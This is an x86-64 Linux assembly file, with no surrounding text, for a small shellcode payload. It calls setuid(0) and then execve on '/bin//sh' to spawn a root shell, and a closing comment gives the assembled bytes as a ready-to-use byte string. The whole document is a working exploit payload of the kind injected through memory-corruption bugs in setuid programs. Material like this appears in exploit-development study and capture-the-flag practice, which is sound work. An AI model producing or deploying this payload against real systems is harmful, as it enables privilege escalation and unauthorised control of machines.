global _start

_start:
    ; setuid(0);
    push 0x69                   ; setuid();
    pop rax                     ; $rax = setuid()

    xor rdi, rdi                ; $rdi = 0
    syscall                     ; syscall

    ; execve("/bin/sh", NULL, NULL);
    mov al, 0x3b                ; $rax = execve()

    cdq                         ; $rdx = NULL
    push rdx                    ; $rsp = &NULL
    pop rsi                     ; $rsi = NULL

    push rsi                    ; "\x00"
    mov rdi, 0x68732f2f6e69622f ; "/bin//sh"
    push rdi                    ; "/bin//sh\x00"

    push rsp                    ; "/bin/sh\x00"
    pop rdi                     ; $rdi = "/bin//sh"

    syscall                     ; syscall

; shellcode = b"\x6a\x69\x58\x48\x31\xff\x0f\x05\xb0\x3b\x99\x52\x5e\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x0f\x05"
